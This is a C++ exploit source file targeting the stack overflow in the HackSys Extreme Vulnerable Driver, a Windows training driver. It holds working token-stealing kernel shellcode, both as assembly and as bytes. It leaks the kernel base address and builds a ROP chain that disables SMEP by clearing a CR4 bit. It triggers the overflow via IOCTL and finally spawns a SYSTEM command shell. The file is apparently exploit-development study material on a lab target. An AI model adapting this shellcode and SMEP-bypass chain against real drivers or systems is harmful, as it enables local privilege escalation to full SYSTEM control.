// HEVDStackBO.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
// Uncommented, as getKernelBase() is not used
//#include <winternl.h>
//#include <Psapi.h>

#define QWORD ULONGLONG

#define TYPE_CONF_IOCTL 0x222023
#define STACK_BO_IOCTL 0x222003

// https://www.vulndev.io/2022/07/02/windows-kernel-exploitation-hevd-x64-stackoverflow/
/*
 * Shellcode which steals the TOKEN of PID 4 and injects it into our process, 
 * afterwards jumps back to userland to skip stack-cleanup (otherwise BSOD)
 * 
[BITS 64]
start:
  mov rax, [gs:0x188]       ; KPCRB.CurrentThread (_KTHREAD)
  mov rax, [rax + 0xb8]     ; APCState.Process (current _EPROCESS)
  mov r8, rax               ; Store current _EPROCESS ptr in RBX
 
loop:
  mov r8, [r8 + 0x448]      ; ActiveProcessLinks
  sub r8, 0x448             ; Go back to start of _EPROCESS
  mov r9, [r8 + 0x440]      ; UniqueProcessId (PID)
  cmp r9, 4                 ; SYSTEM PID? 
  jnz loop                  ; Loop until PID == 4
 
replace:
  mov rcx, [r8 + 0x4b8]      ; Get SYSTEM token
  and cl, 0xf0               ; Clear low 4 bits of _EX_FAST_REF structure
  mov [rax + 0x4b8], rcx     ; Copy SYSTEM token to current process
 
;; https://kristal-g.github.io/2021/05/08/SYSRET_Shellcode.html
cleanup:
  mov rax, [gs:0x188]       ; _KPCR.Prcb.CurrentThread
  mov cx, [rax + 0x1e4]     ; KTHREAD.KernelApcDisable
  inc cx
  mov [rax + 0x1e4], cx
  mov rdx, [rax + 0x90]     ; ETHREAD.TrapFrame
  mov rcx, [rdx + 0x168]    ; ETHREAD.TrapFrame.Rip
  mov r11, [rdx + 0x178]    ; ETHREAD.TrapFrame.EFlags
  mov rsp, [rdx + 0x180]    ; ETHREAD.TrapFrame.Rsp
  mov rbp, [rdx + 0x158]    ; ETHREAD.TrapFrame.Rbp
  xor eax, eax  ;
  swapgs
  o64 sysret  
 */

BYTE sc[256] = {
  0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48,
  0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc0, 0x4d,
  0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x49, 0x81, 0xe8, 0x48,
  0x04, 0x00, 0x00, 0x4d, 0x8b, 0x88, 0x40, 0x04, 0x00, 0x00,
  0x49, 0x83, 0xf9, 0x04, 0x75, 0xe5, 0x49, 0x8b, 0x88, 0xb8,
  0x04, 0x00, 0x00, 0x80, 0xe1, 0xf0, 0x48, 0x89, 0x88, 0xb8,
  0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01,
  0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x66,
  0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x48,
  0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68,
  0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00,
  0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa,
  0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48,
  0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff
};

// https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/
typedef struct SYSTEM_MODULE {
    ULONG                Reserved1;
    ULONG                Reserved2;
    ULONG				 Reserved3;
    PVOID                ImageBaseAddress;
    ULONG                ImageSize;
    ULONG                Flags;
    WORD                 Id;
    WORD                 Rank;
    WORD                 LoadCount;
    WORD                 NameOffset;
    CHAR                 Name[256];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
    ULONG                ModulesCount;
    SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemModuleInformation = 0xb
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
    );

using namespace std;
QWORD get_kernel_base() {

    cout << "[>] Getting kernel base address..." << endl;

    //https://github.com/koczkatamas/CVE-2016-0051/blob/master/EoP/Shellcode/Shellcode.cpp
    //also using the same import technique that @tekwizz123 showed us

    PNtQuerySystemInformation NtQuerySystemInformation =
        (PNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"),
            "NtQuerySystemInformation");

    if (!NtQuerySystemInformation) {

        cout << "[!] Failed to get the address of NtQuerySystemInformation." << endl;
        cout << "[!] Last error " << GetLastError() << endl;
        exit(1);
    }

    ULONG len = 0;
    NtQuerySystemInformation(SystemModuleInformation,
        NULL,
        0,
        &len);

    PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)
        VirtualAlloc(NULL,
            len,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE);

    NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation,
        pModuleInfo,
        len,
        &len);

    if (status != (NTSTATUS)0x0) {
        cout << "[!] NtQuerySystemInformation failed!" << endl;
        exit(1);
    }

    PVOID kernelImageBase = pModuleInfo->Modules[0].ImageBaseAddress;

    cout << "[>] ntoskrnl.exe base address: 0x" << hex << kernelImageBase << endl;

    return (QWORD)kernelImageBase;
}

/*
QWORD getBaseAddr(LPCWSTR drvName) {
    LPVOID drivers[512];
    DWORD cbNeeded;
    int nDrivers, i = 0;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        WCHAR szDrivers[512];
        nDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < nDrivers; i++) {
            if (GetDeviceDriverBaseName(drivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0]))) {
                if (wcscmp(szDrivers, drvName) == 0) {
                    return (QWORD)drivers[i];
                }
            }
        }
    }
    return 0;
}
*/

void stack_bo() {
    HANDLE handle = INVALID_HANDLE_VALUE;
    DWORD bytesReturned = 0;
    CHAR outBuf[2050];

    // Get a händle - yo
    handle = CreateFileW(L"\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_WRITE | GENERIC_READ | GENERIC_EXECUTE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (handle == INVALID_HANDLE_VALUE) {
        std::cout << "[!] Error - stack_bo: CreateFileW" << std::endl;
        return;
    }

    // Get Kernel base for ROP Chain
    // get_kernel_base() uses NtQuerySystemInformation
    // getBaseAddr() uses GetEnumDeviceDrivers
    // both still work on Win11 - 10.0.22621 N/A Build 22621
    QWORD kernelBase = get_kernel_base(); //getBaseAddr(L"ntoskrnl.exe");

    // C:\Users\test7\Desktop\tools\rp-win>rp-win.exe --unique -f C:\Windows\System32\ntoskrnl.exe -r 4 > ntoskrnl.exe.txt
    QWORD mov_cr4_rdx = kernelBase + 0xa7eb57;
    QWORD pop_rdx = kernelBase + 0xa80903;

    // Got this by breaking in the running system and then doing a `r cr4`
    QWORD cr4 = 0x00000000003506f8;
    // Clear the 20th bit of CR4 to disable SMEP
    cr4 &= ~(1UL << 20);

    // Great for inspection and setting further breakpoints
    std::cout << "> DebugBreak()" << std::endl;
    DebugBreak();

    // Index used for offset into the inBuf - ROP-Chain+Shellcode
    int index = 0;

    // RWX as we will write to it and later on execute our shellcode residing in the buffer
    LPVOID inBuf = VirtualAlloc(NULL, 2500, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID shellcode = VirtualAlloc(NULL, 500, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlFillMemory(inBuf, 2500, '\x41');
    RtlCopyMemory(shellcode, sc, 256);

    QWORD* rop = (QWORD*)((QWORD)inBuf + 2072);

    // Building the ROP-Chain to disable SMEP and jump to our shellcode residing in userland
    *(rop + index++) = pop_rdx;
    *(rop + index++) = cr4;
    *(rop + index++) = mov_cr4_rdx;
    *(rop + index++) = (QWORD)shellcode;
    
    // Send buffer with STACK_BO_IOCTL to trigger/exploit the vuln
    BOOL status = DeviceIoControl(handle, STACK_BO_IOCTL, inBuf, 2500, outBuf, sizeof(outBuf), &bytesReturned, (LPOVERLAPPED)NULL);

    cout << "[*] Sent IOCTL...Enjoy SYSTEM shell" << endl;
    system("cmd.exe");
    // CloseHandle commented out as this did raise issues when used before system()
    //CloseHandle(handle);

}


int main()
{
    stack_bo();
    
    return 0;

}
